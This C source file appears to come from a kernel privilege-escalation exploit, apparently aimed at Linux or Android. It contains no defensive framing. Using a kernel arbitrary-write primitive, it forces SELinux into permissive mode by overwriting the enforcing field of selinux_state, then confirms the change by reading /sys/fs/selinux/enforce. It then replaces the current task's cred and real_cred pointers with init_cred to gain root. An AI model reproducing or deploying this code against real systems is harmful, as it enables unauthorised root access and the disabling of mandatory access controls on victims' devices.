#include "common.h"
#include "kprobe_leak.h"
#include "offsets.h"

int gl_selinux_route(const struct gl_offsets *off)
{
    uint64_t target;
    uint64_t value;

    if (!off || off->sym_selinux_state == 0)
        return -1;

    target = gl_alias_of_image(off->sym_selinux_state) +
             GL_SELINUX_ENFORCING_OFF;

    value = gl_alias_of_image(off->sym_zero_page);

    return gl_write8_until(target, value, gl_selinux_permissive);
}

int gl_selinux_permissive(void)
{
    char buf[16];
    int fd;
    ssize_t n;

    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0)
        return 0;

    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0)
        return 0;

    buf[n] = '\0';
    return buf[0] == '0';
}

int gl_cred_install(const struct gl_offsets *off,
                    const struct gl_runtime_ids *ids)
{
    uint64_t init_cred;

    if (!off || !ids || !ids->valid)
        return -1;

    init_cred = gl_alias_of_image(off->sym_init_cred);
    if (init_cred == 0)
        return -1;

    if (gl_write8(ids->task + off->task_off_cred, init_cred) != 0)
        return -1;

    if (geteuid() != 0) {

        return -1;
    }

    if (gl_write8(ids->task + off->task_off_real_cred, init_cred) != 0)
        return -1;

    return 0;
}
